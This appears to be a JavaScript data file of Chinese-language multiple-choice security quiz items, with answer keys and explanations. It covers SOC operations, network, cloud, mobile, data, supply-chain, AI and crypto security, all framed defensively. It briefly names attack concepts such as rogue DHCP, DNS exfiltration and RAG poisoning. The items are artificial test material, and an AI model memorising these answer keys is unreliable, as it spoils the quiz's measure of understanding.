  { id:"st8", cat:"soccti", level:"高级", q:"取证时先做内存镜像的原因是？", options:["内存数据断电即失，包含密钥、进程与网络连接等线索","磁盘数据不重要","内存更容易分析","为了节省磁盘"], answer:0, explain:"内存是「活证据」，一旦重启就永久丢失。" },
  { id:"st9", cat:"soccti", level:"初级", q:"ATT&CK 编号在事件复盘中的价值是？", options:["统一描述攻击者用了哪些技术，便于对齐检测与情报","便于写报告页码","便于统计字数","便于选择工具"], answer:0, explain:"共同语言让复盘结论能直接转化为检测改进项。" },
  { id:"st10", cat:"soccti", level:"中级", q:"情报源「机读」属性为什么重要？", options:["可自动导入检测与处置流程，减少人工搬运","体积更小","更新更快","更准确"], answer:0, explain:"不可机读的情报只能当阅读材料，落地效率低。" },
  { id:"st11", cat:"soccti", level:"中级", q:"若某指标鼓励「多关告警」，可能导致的后果是？", options:["为刷指标而草率关闭，真实威胁被漏掉","提升效率","降低误报","增加检测覆盖"], answer:0, explain:"指标设计不当会诱导错误行为，应关注准确率与漏检复盘。" },
  { id:"st12", cat:"soccti", level:"高级", q:"归因结论标注「置信度」的作用是？", options:["表明证据强度，避免把低置信推断当作事实使用","便于排版","便于统计","便于对外沟通"], answer:0, explain:"归因存在假旗与误判风险，置信度让结论被恰当地使用。" },
  { id:"st13", cat:"soccti", level:"入门", q:"日志集中化时，「只追加」能带来的安全价值是？", options:["攻击者无法通过修改历史掩盖痕迹，只能新增记录","节省存储","加快查询","减少带宽"], answer:0, explain:"只追加与权限隔离让日志具备抗篡改能力。" },
  { id:"st14", cat:"soccti", level:"入门", q:"安全团队分工时，明确「告警归属」的目的是？", options:["避免问题在交接中流失（都以为别人在看）","便于统计工作量","便于排班","便于考核"], answer:0, explain:"归属清晰是闭环的前提，否则会出现无人处理的告警。" },
  { id:"st15", cat:"soccti", level:"入门", q:"收到告警后，「有成功迹象」通常指？", options:["登录成功、文件落地、数据外发、命令执行成功等","告警数量变多","来源 IP 变化","时间在深夜"], answer:0, explain:"成功迹象意味着攻防已经从尝试进入实现阶段，优先级最高。" },
  { id:"st16", cat:"soccti", level:"高级", q:"桌面推演故意设置「关键联系人休假」这类卡点，目的是？", options:["检验预案在真实不利条件下是否仍然可用","增加难度系数","为了让演练更精彩","为了考核个人"], answer:0, explain:"真实事件常发生在最不方便的时刻，预案必须对此有安排。" },
  { id:"st17", cat:"soccti", level:"中级", q:"把情报转成检测假设后，验证方式是？", options:["用模拟动作或历史数据回归，确认规则真能检出","等真实攻击来验证","只做文档记录","通知情报源"], answer:0, explain:"未验证的规则等于假设未闭环，可能长期无效而不自知。" },
  { id:"bz5", cat:"binary", level:"中级", q:"在开启 ASLR 的环境中，利用通常还需要？", options:["先泄露一个地址（信息泄露）来推算基址","关闭防火墙","使用更长的 payload","改用 Windows"], answer:0, explain:"ASLR 让地址随机化，信息泄露是绕过它的常见前置条件。" },

  // ---- v1.5.3 批次 1（套餐 D）：24 知识点 + 72 题 ----
  { id:"nd1", cat:"network", level:"中级", q:"部署伪造 DHCP 服务器最直接的危害是？", options:["把网关与 DNS 指向攻击者，实现中间人劫持","导致交换机重启","提升带宽占用","使域名无法注册"], answer:0, explain:"客户端不校验 DHCP 来源，谁先应答就听谁，从而接管流量路径与解析。" },
  { id:"nd2", cat:"network", level:"中级", q:"抑制私接 DHCP 服务器最有效的手段是？", options:["交换机开启 DHCP Snooping，只信任上联口","提高口令复杂度","关闭 ICMP","启用 HTTPS"], answer:0, explain:"二层准入控制从源头拦住伪造应答；终端侧无法自行防御。" },
  { id:"nd3", cat:"network", level:"中级", q:"排查「客户端拿到异常网关」时，最有价值的证据是？", options:["DHCP 租约与交换机端口的 DHCP 日志","浏览器缓存","DNS 查询次数","磁盘使用率"], answer:0, explain:"租约与端口日志能定位到是哪个接口在分发异常配置。" },
  { id:"nb9", cat:"network", level:"初级", q:"堡垒机的核心价值是？", options:["把运维访问收敛到统一通道做认证、授权与审计","提升服务器性能","加密全部内网流量","替代防火墙"], answer:0, explain:"收敛入口才能实现「一人一号、全程留痕、按需授权」。" },
  { id:"nb10", cat:"network", level:"初级", q:"要让堡垒机真正生效，必须同时做到？", options:["关掉终端直连生产的路径（安全组只放行堡垒机）","只安装堡垒机软件","只配置录屏","只做双因素"], answer:0, explain:"存在旁路直连时，所有管控都可被绕过。" },
  { id:"nb11", cat:"network", level:"中级", q:"服务器出网统一走代理的主要目的是？", options:["可审计、可拦截、可限制，降低数据外传与 C2 风险","提升访问速度","节省带宽费用","简化 DNS 配置"], answer:0, explain:"统一出口让出网行为可见可控，是外传与 C2 检测的基础。" },
  { id:"nb12", cat:"network", level:"中级", q:"仅按域名白名单做出网管控，可能被什么绕过？", options:["直连 IP 或经 DNS 外带数据","增加并发连接","使用 HTTPS","降低发包频率"], answer:0, explain:"因此还需封禁直连公网并管住 DNS，形成多层约束。" },
  { id:"nv1", cat:"network", level:"高级", q:"双栈环境中 IPv6 常成为风险盲区，原因是？", options:["安全策略与日志往往只覆盖 IPv4","IPv6 无法被扫描","IPv6 不支持加密","IPv6 地址不固定"], answer:0, explain:"策略未覆盖等于开了一扇无人管理的门，需与 IPv4 一致管控。" },
  { id:"nv2", cat:"network", level:"高级", q:"下列哪项可能绕过基于 IPv4 的策略控制？", options:["6to4/Teredo 等隧道机制","启用 HTTPS","使用私有地址","增大 MTU"], answer:0, explain:"隧道会把 IPv6 流量封装进 IPv4 传输，绕过原有策略边界。" },
  { id:"nv3", cat:"network", level:"高级", q:"IPv6 下 NAT 遮蔽作用消失，意味着？", options:["内网地址可被直接访问，暴露面管理必须显式化","网络性能下降","必须禁用 IPv6","不再需要防火墙"], answer:0, explain:"失去隐式遮蔽后，只能靠显式的策略最小放通来管理暴露面。" },
  { id:"nz14", cat:"network", level:"高级", q:"零信任与传统 VPN 的核心区别是？", options:["按应用粒度持续校验身份与设备，而不是进网即信任","完全不使用加密","只使用口令认证","取消了网络分区"], answer:0, explain:"零信任把「位置信任」替换为「每次访问都校验」，显著缩小可达范围。" },
  { id:"nz10", cat:"network", level:"高级", q:"ZTNA 落地最容易退化的地方是？", options:["策略膨胀最终变回「全放通」","加密强度不足","客户端体积过大","日志格式不统一"], answer:0, explain:"因此需要定期复核策略与变更留痕，避免「名义零信任、实际全放通」。" },
  { id:"nz11", cat:"network", level:"中级", q:"安全组只放行堡垒机来源后，仍需防范的是？", options:["堡垒机自身被攻陷后成为横向跳板","终端无法登录服务器","运维效率下降","日志量增加"], answer:0, explain:"堡垒机是高价值单点，需重点加固并限制其可达范围。" },
  { id:"nz12", cat:"network", level:"中级", q:"出网日志对检测的价值体现在？", options:["能发现异常目的地、非工作时段大流量上传与少见协议","提升解析速度","减少带宽消耗","加密流量内容"], answer:0, explain:"出网行为基线是发现 C2 与数据外传的有效手段。" },
  { id:"nz13", cat:"network", level:"初级", q:"运维账号「一人一号」的意义是？", options:["操作可追溯到具体的人，避免共享账号导致无法定责","减少账号数量","简化授权","降低服务器负载"], answer:0, explain:"共享账号会让审计失效，出事时无法定位责任人。" },
  { id:"cc1", cat:"cloud", level:"中级", q:"CSPM 的核心作用是？", options:["持续检查云上配置是否偏离安全基线并给出治理优先级","替代漏洞扫描","替代防火墙","管理计费"], answer:0, explain:"云上配置即安全边界，持续比对基线与实际是关键动作。" },
  { id:"cc2", cat:"cloud", level:"中级", q:"下列哪项属于 CSPM 的典型检查项？", options:["对象存储是否对外公开、安全组是否放通 0.0.0.0/0 管理端口","实例的 CPU 使用率","磁盘 IOPS","镜像构建时长"], answer:0, explain:"CSPM 关注配置类风险（暴露面、权限、日志开关），而非性能指标。" },
  { id:"cc3", cat:"cloud", level:"初级", q:"云上漏洞优先修复顺序应优先考虑？", options:["公网可达 + 核心数据 + 有公开利用的漏洞","漏洞编号大小","扫描耗时","修复难度"], answer:0, explain:"结合暴露面与资产重要性排序，才能把有限人力用在真实风险上。" },
  { id:"cc4", cat:"cloud", level:"初级", q:"漏洞清单要与什么数据合并才有意义？", options:["资产台账与暴露面清单","计费账单","镜像体积","日志条数"], answer:0, explain:"不知道漏洞落在哪个业务与是否对外，就无法判断优先级。" },
  { id:"cc5", cat:"cloud", level:"中级", q:"IaC 安全的最大价值是？", options:["配置变更可评审、可回溯，高危配置能在合并前被拦截","提升部署速度","减少云成本","简化监控"], answer:0, explain:"把配置纳入代码流程后，安全基线才能前移到变更入口。" },
  { id:"cc6", cat:"cloud", level:"中级", q:"IaC 实践中必须特别注意保护的是？", options:["state 文件（常含敏感信息）与其中的密钥","README 文档","变量命名","目录结构"], answer:0, explain:"state 记录资源与属性，泄露可能导致凭据与架构暴露。" },
  { id:"cc7", cat:"cloud", level:"中级", q:"「配置漂移」的治理方式是？", options:["定期比对代码声明与实际配置并收敛差异","关闭审计日志","增加巡检人员","提高扫描频率"], answer:0, explain:"漂移多来自手工临时修改，需自动比对与回收。" },
  { id:"clt1", cat:"cloud", level:"高级", q:"多租户系统中最容易发生跨租户泄露的层是？", options:["数据层（数据库、检索、缓存、队列）缺少强制租户过滤","前端界面","日志系统","DNS 解析"], answer:0, explain:"只要有一处查询漏掉租户条件，就可能读出他人数据。" },
  { id:"clt2", cat:"cloud", level:"高级", q:"缓存键不含租户标识会导致？", options:["不同租户的数据互相串用","缓存命中率下降","缓存体积变大","缓存过期变快"], answer:0, explain:"缓存是跨租户泄露的高发点，键设计必须含租户维度。" },
  { id:"clt3", cat:"cloud", level:"高级", q:"多租户隔离通常需要覆盖哪几层？", options:["网络、身份、数据与运行环境","界面、报表、导出与打印","开发、测试、预发与生产","日志、指标、追踪与告警"], answer:0, explain:"四层缺一即可被绕过，其中数据层强制过滤最关键。" },
  { id:"cd1", cat:"cloud", level:"高级", q:"灾备指标 RTO 指的是？", options:["业务恢复所需的时间","能容忍的数据丢失量","备份成功率","演练次数"], answer:0, explain:"RTO 管恢复速度、RPO 管数据丢失容忍度，二者都要书面明确并演练验证。" },
  { id:"cd2", cat:"cloud", level:"高级", q:"为什么备份需要「不可变或离线」副本？", options:["勒索攻击会优先破坏在线备份，不可变副本才能保证可恢复","节省存储","提升备份速度","减少备份数量"], answer:0, explain:"没有隔离副本时，一次入侵就可能同时毁掉数据与备份。" },
  { id:"cd3", cat:"cloud", level:"高级", q:"云上灾备最容易忽视的单点是？", options:["依赖项（DNS、密钥服务、外部接口）","实例规格","镜像大小","日志条数"], answer:0, explain:"核心系统恢复后若依赖不可用，业务仍然起不来。" },
  { id:"cd4", cat:"cloud", level:"中级", q:"CSPM 要与哪些数据联动才有实际价值？", options:["资产、身份、漏洞与 IaC 扫描结果","计费与容量","镜像仓库大小","开发排期"], answer:0, explain:"只有能回答「谁受影响、谁能改、改没改」，配置告警才可运营。" },
  { id:"cd5", cat:"cloud", level:"初级", q:"云上「资产变动快」带来的治理难点是？", options:["漏洞与配置清单容易过期，必须自动化持续采集","网络延迟高","存储成本高","实例性能不足"], answer:0, explain:"人工维护的台账在云上必然过期，自动化采集是前提。" },
  { id:"bt1", cat:"blue", level:"中级", q:"告警降噪的第一步应该是？", options:["统计哪几条规则贡献了大部分告警量","直接关闭所有低危规则","增加值班人数","购买新设备"], answer:0, explain:"先量化再治理，避免凭感觉调整导致漏检。" },
  { id:"bt2", cat:"blue", level:"中级", q:"对「规则本身没问题但缺上下文」导致的告警，正确处理是？", options:["补上下文（资产、账号、历史行为）而不是关规则","直接关闭该规则","提高阈值","删除样本"], answer:0, explain:"补上下文能让原本噪音的规则变成有效告警，关掉会损失检测能力。" },
  { id:"bt3", cat:"blue", level:"中级", q:"「承认（acknowledge）」类抑制与直接关闭规则的区别在于？", options:["承认有到期时间与责任人，属于临时处置","承认更彻底","两者完全相同","承认会删除规则"], answer:0, explain:"带到期的抑制能避免「临时规则永久化」造成检测盲区。" },
  { id:"bo1", cat:"blue", level:"初级", q:"值班交接清单中必不可少的项是？", options:["未闭环事项与临时抑制规则的到期时间","个人休假安排","设备采购计划","预算余额"], answer:0, explain:"交接遗漏会导致告警无人处理或长期误抑制。" },
  { id:"bo2", cat:"blue", level:"初级", q:"告警分级（P1-P4）的意义是？", options:["让响应时限与升级路径有明确依据","减少告警数量","提升检测精度","降低设备成本"], answer:0, explain:"分级是把有限人力投向最紧急事件的前提。" },
  { id:"bo3", cat:"blue", level:"高级", q:"值班人员疲劳与漏判之间的关系是？", options:["疲劳是漏判的主要来源之一，需控制班次负荷与交接质量","疲劳不影响技术判断","只有白班需要关注","与流程设计无关"], answer:0, explain:"人的状态直接决定研判质量，排班与交接规范属于实质性的安全控制。" },
  { id:"be1", cat:"blue", level:"中级", q:"处置工单中「判断依据」为什么必须记录？", options:["便于事后复核与复盘，避免结论无法追溯","便于统计字数","便于考核","便于归档"], answer:0, explain:"没有依据的结论无法复核，同期事件也难以沉淀经验。" },
  { id:"be2", cat:"blue", level:"中级", q:"涉及主机处置时，先固定证据再动手的原因是？", options:["操作会破坏内存与运行状态证据，导致无法溯源","为了节省时间","因为流程要求","便于生成报告"], answer:0, explain:"内存与运行态证据一旦重启或清理就不可恢复。" },
  { id:"be3", cat:"blue", level:"中级", q:"证据文件记录哈希的目的是？", options:["证明文件在保存与移交过程中未被篡改","压缩体积","加快读取","便于检索"], answer:0, explain:"哈希是证据完整性可验证的基础。" },
  { id:"bc1", cat:"blue", level:"中级", q:"云上检测应优先接入的数据是？", options:["云操作审计、身份与权限变更、密钥使用","实例温度监控","磁盘碎片率","屏幕分辨率"], answer:0, explain:"云上攻击多发生在控制面，审计与身份数据最关键。" },
  { id:"bc2", cat:"blue", level:"中级", q:"「关闭审计日志配置」这类操作需要重点告警的原因是？", options:["它是攻击者隐藏痕迹的前置动作","它会增加成本","它会影响业务","它需要重启服务"], answer:0, explain:"日志开关的变更往往是入侵后的第一步，必须高优先告警。" },
  { id:"bc3", cat:"blue", level:"中级", q:"多账号云环境防止业务侧删除日志的做法是？", options:["把审计日志集中到独立账号并设为只追加","在每个账号本地保存","加密日志文件","只保留 7 天"], answer:0, explain:"集中且不可删，才能保证事后取证不受业务账号影响。" },
  { id:"bm1", cat:"blue", level:"初级", q:"事件对外沟通中最重要的纪律是？", options:["只讲已确认的事实，明确区分待确认项","尽量少说话","只发一次通告","由技术负责人直接对媒体说明"], answer:0, explain:"猜测与过度承诺会在后续被推翻，反而放大信任损失。" },
  { id:"bm2", cat:"blue", level:"初级", q:"提前准备客服 FAQ 的价值是？", options:["一线能统一口径快速回应，避免信息混乱","减少客服人数","降低话务量","便于审计"], answer:0, explain:"事件中客服是用户感知的第一触点，口径混乱会放大恐慌。" },
  { id:"bm3", cat:"blue", level:"高级", q:"判断是否需要向监管与用户通报，依据是？", options:["合规要求（数据类型、影响范围与时限规定）","事件的技术复杂度","涉及的服务器数量","内部讨论结果"], answer:0, explain:"通报义务由法律与监管规则决定，需按流程与时限执行并留证。" },
  { id:"mc1", cat:"mobile", level:"中级", q:"客户端密钥若可被导出，说明？", options:["加密保护基本失效，攻击者可解密全部本地数据","加密强度不足但仍安全","需要更长密钥","需要更换算法"], answer:0, explain:"可导出的密钥等于把钥匙一起交出去，应使用系统密钥库并禁止导出。" },
  { id:"mc2", cat:"mobile", level:"中级", q:"客户端加密的防御上界是？", options:["设备被完全控制时无法保证，关键校验必须在服务端","等同于服务端防护","可完全替代服务端校验","取决于加密算法强度"], answer:0, explain:"客户端只是提高成本，安全判断不能依赖它。" },
  { id:"mc3", cat:"mobile", level:"中级", q:"检查本地数据保护时，最容易被忽略的一处是？", options:["备份导出中是否包含明文敏感数据","应用图标分辨率","启动耗时","界面语言"], answer:0, explain:"备份通道常绕过数据保护策略，需单独核查。" },
  { id:"mo1", cat:"mobile", level:"中级", q:"代码混淆的真实作用是？", options:["提高逆向成本，但不能阻止有经验的分析者","彻底防止逆向","替代服务端校验","加密网络流量"], answer:0, explain:"混淆是成本博弈，安全逻辑仍应放在服务端。" },
  { id:"mo2", cat:"mobile", level:"中级", q:"评估混淆效果最实际的判据是？", options:["关键逻辑（签名、风控）是否仍能被定位","类名长度","包体积","构建耗时"], answer:0, explain:"混淆的价值体现在关键逻辑的可分析难度上。" },
  { id:"mo3", cat:"mobile", level:"高级", q:"面对强混淆与加固，安全投入更合理的分配是？", options:["把重点放在服务端校验与风控，客户端只做成本提升","无限加大混淆强度","放弃客户端保护","依赖应用商店审核"], answer:0, explain:"客户端防护收益递减，服务端才是可控的信任边界。" },
  { id:"ms1", cat:"mobile", level:"初级", q:"应用上架被退回的常见原因是？", options:["申请的权限与功能不匹配、隐私政策与实际采集不一致","应用体积过大","图标不够美观","启动速度慢"], answer:0, explain:"权限、功能、政策三者必须一致，第三方 SDK 采集也要如实声明。" },
  { id:"ms2", cat:"mobile", level:"初级", q:"上架前的「三方核对」指？", options:["权限声明、实际功能与隐私政策三者一致","开发、测试与运维三方确认","三家应用商店同时提交","三种机型兼容测试"], answer:0, explain:"三者不一致是合规风险的主要来源，也是审核重点。" },
  { id:"ms3", cat:"mobile", level:"高级", q:"把上架合规当成持续过程而非一次性动作的原因是？", options:["政策、SDK 与地区要求会变化，需纳入发版流程定期复核","审核流程太长","商店规则不公开","用户会投诉"], answer:0, explain:"合规要求持续演进，临时补材料必然滞后。" },
  { id:"dm1", cat:"datasec", level:"中级", q:"数据资产地图的最小可用内容应包括？", options:["数据位置、字段含义、等级、责任人与访问者","服务器型号与机柜位置","开发人员名单","备份软件版本"], answer:0, explain:"地图要能回答「数据在哪、谁负责、谁能访问」，才能驱动后续治理。" },
  { id:"dm2", cat:"datasec", level:"中级", q:"数据血缘最直接的价值是？", options:["出事时能快速圈定受影响的下游范围","提升查询性能","减少存储占用","方便做报表美化"], answer:0, explain:"血缘把「影响面判定」从人工排查变成可查询的路径。" },
  { id:"dm3", cat:"datasec", level:"高级", q:"人工维护血缘的局限性与解法是？", options:["易过期，应通过解析 SQL 与任务依赖自动采集","无法采集，只能人工","血缘不重要","只需维护核心表"], answer:0, explain:"自动化采集才能跟上数据链路的变化速度。" },
  { id:"dh1", cat:"datasec", level:"中级", q:"向合作方提供数据时，「能聚合就不给明细」体现了？", options:["最小必要原则：只提供实现目的所需的最小粒度","数据脱敏技术","加密传输要求","存储优化策略"], answer:0, explain:"粒度最小化能显著降低泄露与再识别风险。" },
  { id:"dh2", cat:"datasec", level:"中级", q:"对外数据接口的必备控制是？", options:["鉴权、限流与字段白名单","CAPTCHA","静态资源缓存","界面水印"], answer:0, explain:"这三项分别对应「谁能调、能调多少、能取哪些字段」。" },
  { id:"dh3", cat:"datasec", level:"高级", q:"数据共享中「组合风险」指的是？", options:["对方将本批数据与他方数据结合后可能产生新的识别能力","数据量过大","格式不统一","传输延迟"], answer:0, explain:"因此要在给之前评估组合后的可识别性，并做相应脱敏。" },
  { id:"da1", cat:"datasec", level:"高级", q:"使用真实数据训练模型前，最应先确认的是？", options:["原始授权是否覆盖「训练模型」这一用途","数据量是否足够","字段是否整齐","算力是否充足"], answer:0, explain:"用途超出原授权范围会直接构成违规，需重新取得同意或改用脱敏数据。" },
  { id:"da2", cat:"datasec", level:"高级", q:"「从模型中删除某条训练数据」在技术上难以实现的含义是？", options:["应在源头把关数据准入，而不是指望事后删除","模型不会被泄露","删除功能没必要","只需重训一次即可"], answer:0, explain:"模型可能记住训练数据，事后删除极难，源头控制更现实。" },
  { id:"da3", cat:"datasec", level:"中级", q:"训练数据优先使用脱敏或合成数据的原因是？", options:["在满足训练效果的同时降低个人信息暴露与合规风险","合成数据更便宜","脱敏能提升准确率","真实数据不可用"], answer:0, explain:"降低敏感度是合规与安全的最优解，但需评估对效果的影响。" },
  { id:"sl1", cat:"supply", level:"初级", q:"开源「宽松许可证」通常的主要义务是？", options:["保留版权与许可声明","必须开源自己的代码","禁止商业使用","必须支付费用"], answer:0, explain:"MIT/Apache/BSD 类以保留声明为主，传染性许可才涉及开源衍生作品。" },
  { id:"sl2", cat:"supply", level:"初级", q:"引入 GPL 类组件时最需要评估的是？", options:["其传染性是否与产品分发方式兼容","代码行数","Star 数量","文档语言"], answer:0, explain:"许可证不兼容可能导致被迫开源或法律风险。" },
  { id:"sl3", cat:"supply", level:"高级", q:"AGPL 相比 GPL 的额外要求主要针对？", options:["以网络服务形式提供软件的场景","移动应用分发","嵌入式设备","内部使用"], answer:0, explain:"AGPL 把「通过网络提供服务」也纳入开源义务触发条件。" },
  { id:"su1", cat:"supply", level:"中级", q:"依赖升级「越拖越难升」的根本原因是？", options:["版本跨度变大后接口变更与兼容风险累积","依赖包体积增长","仓库带宽限制","许可证过期"], answer:0, explain:"小步持续升级能把风险摊薄，积攒大版本则一次跨越过多变更。" },
  { id:"su2", cat:"supply", level:"中级", q:"无法立即升级的高危依赖，应如何处理？", options:["记录原因与补偿控制并设定复核期限","从清单中删除","标记为已修复","忽略不管"], answer:0, explain:"显式登记与补偿控制比隐瞒更安全，也便于后续跟踪。" },
  { id:"su3", cat:"supply", level:"中级", q:"把「依赖新鲜度」当作健康指标的意义是？", options:["可持续发现长期不升级的组件，避免漏洞债累积","提升构建速度","减少镜像体积","降低测试成本"], answer:0, explain:"指标化能让升级这件事从「想起来才做」变成常态化管理。" },
  { id:"sa1", cat:"supply", level:"中级", q:"引入第三方组件前的评审清单中，属于高风险信号的是？", options:["包含安装/构建脚本且来源不可信","文档使用英文","有单元测试","有 CI 配置"], answer:0, explain:"安装脚本在安装期执行代码，是投毒的常见载体。" },
  { id:"sa2", cat:"supply", level:"中级", q:"对加密、网络、系统操作类组件应重点审查什么？", options:["其权限与网络行为是否与声称功能相符","代码注释数量","变量命名风格","目录结构"], answer:0, explain:"能力越强的组件一旦被投毒，危害越大，需要更严格审查。" },
  { id:"sa3", cat:"supply", level:"高级", q:"把「新增依赖需评审」固化为门禁的价值是？", options:["在引入环节拦住风险，而不是事后排查","减少依赖数量","加快构建速度","降低仓储成本"], answer:0, explain:"入口管控的成本远低于事后在全量系统里排查与整改。" },

  // ---- v1.5.3 批次 2（套餐 D）：aisec/soccti 各 +3，12 领域齐达 20 ----
  { id:"aix18", cat:"aisec", level:"中级", q:"RAG 工程中，入库环节最该控制的是？", options:["谁能写入与内容是否经过审核","检索速度","向量维度","分块大小"], answer:0, explain:"知识库对模型是可信感很强的信息源，写入权限与审核是投毒防御的第一道门。" },
  { id:"aix19", cat:"aisec", level:"中级", q:"检索结果交给模型时，正确的处理是？", options:["明确标注为「数据」并与指令分隔，降低被当作指令的概率","直接拼在系统提示后面","加密后再拼接","转成图片给模型"], answer:0, explain:"检索内容属不可信输入，结构化标注能显著降低间接注入成功率。" },
  { id:"aix20", cat:"aisec", level:"高级", q:"判断 RAG 回答是否可信，最实用的工程手段是？", options:["要求引用可溯源并能点回原文核对","提高温度参数","增大上下文窗口","换成更大的模型"], answer:0, explain:"引用溯源让用户能验证依据，也是发现投毒与幻觉的主要途径。" },
  { id:"aig1", cat:"aisec", level:"高级", q:"Agent 护栏中「是否需要人工确认」应由谁决定？", options:["由服务端代码按动作等级决定，不能交给模型判断","由模型自行判断","由用户随口决定","由前端界面决定"], answer:0, explain:"模型判断可被诱导绕过，确认逻辑必须在不可被模型影响的一侧。" },
  { id:"aig2", cat:"aisec", level:"高级", q:"工具调用的「幂等」控制解决什么问题？", options:["防止重复调用造成重复副作用（如重复下单、重复发送）","提升调用速度","减少 token 消耗","降低模型幻觉"], answer:0, explain:"幂等与去重是限制副作用放大的关键工程手段。" },
  { id:"aig3", cat:"aisec", level:"中级", q:"衡量护栏有效性应关注？", options:["拦截率与漏拦率，并用红队样本持续回归","拦截次数总量","代码行数","部署组件数量"], answer:0, explain:"只有可度量的护栏才能持续改进，也才能发现被绕过的情况。" },
  { id:"ail1", cat:"aisec", level:"初级", q:"对外发布 AI 生成内容时，基本要求是？", options:["标注为 AI 生成/辅助并保留生成记录","完全不需要说明","只保留最终版本","由发布者口头说明"], answer:0, explain:"标识与留痕是合规与信任的基础，也便于事后追溯。" },
  { id:"ail2", cat:"aisec", level:"初级", q:"把「AI 说的」当作免责理由为何不可接受？", options:["对外内容的责任仍在发布方，需人工审核与责任人确认","因为 AI 不会出错","因为法律没有规定","因为用户不在意"], answer:0, explain:"审核与责任必须落到人，AI 只是工具。" },
  { id:"ail3", cat:"aisec", level:"高级", q:"AI 内容标识要求对工程的主要影响是？", options:["把标识与审核纳入发布流程门禁，而不是事后补标","只需在页面加一行说明","只在移动端标识","只对视频标识"], answer:0, explain:"标识与审核要成为流程约束，否则必然遗漏。" },
  { id:"st18", cat:"soccti", level:"中级", q:"对外共享威胁情报前，必须先做的是？", options:["脱敏，去掉内部资产、IP 与人员等敏感信息","先发给所有订阅方","先公开到社交媒体","先删除时间信息"], answer:0, explain:"共享即外传，未脱敏可能泄露自身资产与调查进展。" },
  { id:"st19", cat:"soccti", level:"中级", q:"共享情报时标注可信度与来源的价值是？", options:["让接收方知道该情报的证据强度与适用性","便于统计条数","便于美化报告","便于收费"], answer:0, explain:"缺可信度标注会让接收方误用低置信推断，造成误封与误判。" },
  { id:"st20", cat:"soccti", level:"高级", q:"收到外部情报后，让它产生价值的动作是？", options:["转化为检测规则或狩猎假设并做回归验证","直接归档","转发到群里","打印留存"], answer:0, explain:"情报价值在落地与验证，未验证的情报无法确定是否真的有效。" },
  { id:"sn1", cat:"soccti", level:"高级", q:"当主机日志被清理时，网络侧数据能提供什么？", options:["通信对象、时间窗与数据量等元数据证据","完整的文件内容（加密时也总能解密）","操作系统日志","用户口令"], answer:0, explain:"网络元数据在主机证据缺失时是关键的替代与交叉验证来源。" },
  { id:"sn2", cat:"soccti", level:"高级", q:"流量回溯的正确起点是？", options:["先定位时间窗与相关主机，再提取对应会话","直接导出全部流量","先看 DNS 日志","先重启设备"], answer:0, explain:"按时间与五元组收窄范围，才能高效定位并重建会话。" },
  { id:"sn3", cat:"soccti", level:"中级", q:"全流量留存与元数据留存应如何取舍？", options:["元数据长期留存用于基线与回溯，全流量按需开启并短留存","全部全流量长期留存","只保留 DNS 日志","只保留告警"], answer:0, explain:"在成本与调查能力之间取平衡，是流量留存设计的核心取舍。" },
  { id:"sh1", cat:"soccti", level:"中级", q:"狩猎能否成功，最常受限于？", options:["数据与字段是否齐全（如缺少源 IP 就无法溯源）","查询语句是否够长","分析师人数","设备品牌"], answer:0, explain:"数据缺口是狩猎失败的首要原因，发现缺口要推动补齐。" },
  { id:"sh2", cat:"soccti", level:"中级", q:"把常用狩猎查询沉淀成「查询库」的价值是？", options:["复用与迭代，避免每次从零写查询","便于统计查询数量","便于考核","减少存储"], answer:0, explain:"查询库让狩猎经验可累积，也便于定期复跑发现变化。" },
  { id:"sh3", cat:"soccti", level:"高级", q:"如何让数据采集策略跟上狩猎需求？", options:["把高频狩猎需求反馈给采集侧，按需补齐字段与留存","只增加存储容量","只买新工具","加密所有日志"], answer:0, explain:"采集与狩猎之间要有反馈闭环，才能持续提升可见性。" },

  // ---- v1.5.3 批次 2b：binary/crypto/pentest 补齐到 20 ----
  { id:"bs1", cat:"binary", level:"中级", q:"静态分析寻找内存漏洞时，最优先关注的函数类型是？", options:["不受长度限制的拷贝与格式化函数","数学运算函数","界面渲染函数","日志打印函数"], answer:0, explain:"这类函数对外部输入长度不做约束，是溢出类漏洞的高发点。" },
  { id:"bs2", cat:"binary", level:"中级", q:"判断「用户输入能否走到危险函数」的过程称为？", options:["数据流追踪（污点分析思路）","模糊测试","符号执行","逻辑回归"], answer:0, explain:"从入口到危险点的可达性是漏洞成立的前提，也是静态分析的核心工作。" },
  { id:"bs3", cat:"binary", level:"高级", q:"静态分析结论为何仍需动态验证？", options:["工具受间接调用与结构体解析限制，可能误判或漏判","动态分析更省时间","静态分析不合法","编译器会优化掉漏洞"], answer:0, explain:"关键结论必须用调试器构造输入确认，避免把误报当漏洞提交。" },
  { id:"bk1", cat:"binary", level:"高级", q:"内核驱动漏洞最常见的成因是？", options:["对用户传入的参数（长度、指针、类型）校验不足","代码注释太少","函数命名不规范","缺少单元测试"], answer:0, explain:"用户态可控参数未校验会导致越界读写、任意地址访问等严重后果。" },
  { id:"bk2", cat:"binary", level:"高级", q:"内核漏洞利用通常还需要绕过哪些保护？", options:["SMEP/SMAP、KASLR、CFI 等缓解机制","HTTPS 证书校验","防火墙策略","反病毒特征"], answer:0, explain:"内核侧缓解更强，利用门槛高但一旦成功即取得最高权限。" },
  { id:"bk3", cat:"binary", level:"高级", q:"从防御角度降低内核漏洞影响的方向是？", options:["最小化驱动加载、要求签名、及时更新并开启缓解机制","关闭所有日志","降低内核版本","禁用内存保护"], answer:0, explain:"减少可加载的驱动面并保持更新，能显著缩小内核攻击面。" },
  { id:"cr1", cat:"crypto", level:"中级", q:"使用时间戳作为随机数种子会导致？", options:["生成的令牌或密钥可被预测","随机数变慢","需要更多内存","加密强度提升"], answer:0, explain:"可预测的随机等于没有随机，令牌与密钥都可能被推算。" },
  { id:"cr2", cat:"crypto", level:"中级", q:"签名中的 nonce（随机数）被重复使用会有什么后果？", options:["可能直接泄露签名私钥","签名变慢","签名验证失败","密钥自动轮换"], answer:0, explain:"这是密码学中著名的致命错误，nonce 必须每次唯一且不可预测。" },
  { id:"cr3", cat:"crypto", level:"高级", q:"容器或虚拟机启动初期熵不足的风险是？", options:["随机数质量下降，可能生成可预测的密钥或令牌","启动变慢","内存占用升高","网络不通"], answer:0, explain:"熵不足是云上容易被忽视的随机数风险，敏感生成应等待熵就绪。" },
  { id:"cs1", cat:"crypto", level:"高级", q:"比较口令或令牌时禁止使用普通字符串比较，原因是？", options:["普通比较会提前返回，时间差可被用来逐字节推断","普通比较不支持中文","速度太慢","占用内存过多"], answer:0, explain:"必须使用常量时间比较函数，避免时间侧信道泄露。" },
